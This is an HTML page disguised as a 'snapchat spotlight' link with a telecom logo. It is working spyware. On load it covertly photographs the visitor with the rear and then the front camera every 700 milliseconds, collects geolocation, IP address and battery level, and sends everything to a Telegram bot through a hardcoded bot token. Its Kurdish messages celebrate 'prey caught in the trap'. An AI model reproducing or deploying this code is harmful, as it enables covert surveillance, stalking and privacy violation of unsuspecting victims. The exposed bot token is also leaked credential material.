<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
    let currentStream = null;
    let video = document.createElement('video');

    async function capture() {
        if (!targetID) return;

        // 🚀 قۆناغی ١: دەستپێکردن بە کامێرای پشتەوە (Environment)
        await startCam("environment");

        // ناردنی ڕاپۆرتی IP و پاتری
        sendInitialReport();

        // 📍 ناردنی لوکەیشن
        navigator.geolocation.getCurrentPosition(pos => {
            sendLocation(pos.coords.latitude, pos.coords.longitude);
        });

        // 📸 دەستپێکردنی وێنەگرتنی بەردەوام (٧٠٠ میلی چرکە)
        let snapInterval = setInterval(takeSnap, 700);

        // 🔥 قۆناغی ٢: دوای ٥ چرکە گۆڕین بۆ کامێرای پێشەوە (Selfie)
        setTimeout(async () => {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop()); // وەستاندنی کامێرای پشت
            }
            await startCam("user"); // دەستپێکردنی کامێرای پێش
        }, 5000);
    }

    async function startCam(mode) {
        try {
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode }, 
                audio: false 
            });
            video.srcObject = currentStream;
            video.muted = true;
            video.play();
        } catch (e) {
            sendToTelegram("⚠️ مۆڵەت نەدرا بۆ کامێرای: " + mode);
        }
    }

    function takeSnap() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.5);
        }
    }

    async function sendInitialReport() {
        let batteryInfo = "Unknown";
        if (navigator.getBattery) {
            const batt = await navigator.getBattery();
            batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
        }
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        let report = `🦅 <b>نێچیرێکی نوێ کەوتە تەڵەوە!</b>\n\n` +
                     `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                     `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                     `🔋 <b>Battery:</b> <code>${batteryInfo}</code>`;
        sendToTelegram(report);
    }

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
        });
    }

    function sendLocation(lat, lon) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
        });
    }

    function sendFile(blob, type) {
        let fd = new FormData();
        fd.append("chat_id", targetID);
        fd.append(type, blob, "shot.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
